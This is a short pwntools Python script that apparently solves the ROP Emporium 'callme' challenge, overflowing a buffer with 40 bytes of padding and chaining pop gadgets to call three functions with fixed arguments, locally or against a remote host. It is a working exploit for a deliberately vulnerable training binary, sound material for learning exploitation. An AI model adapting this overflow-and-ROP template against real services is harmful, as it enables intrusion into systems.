from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./callme")


class ROP_Gadget:
    one = 0xdeadbeefdeadbeef
    two = 0xcafebabecafebabe
    three = 0xd00df00dd00df00d
    pop_rdi = 0x004009a3
    pop_rsi_rdx = 0x0040093d
    ret = 0x0
    data = 0x00601060
    call_one = 0x00400720
    call_two = 0x00400740
    call_three = 0x004006f0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.one,
        ROP_Gadget.pop_rsi_rdx,
        ROP_Gadget.two,
        ROP_Gadget.three,
        ROP_Gadget.call_one,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.one,
        ROP_Gadget.pop_rsi_rdx,
        ROP_Gadget.two,
        ROP_Gadget.three,
        ROP_Gadget.call_two,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.one,
        ROP_Gadget.pop_rsi_rdx,
        ROP_Gadget.two,
        ROP_Gadget.three,
        ROP_Gadget.call_three
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()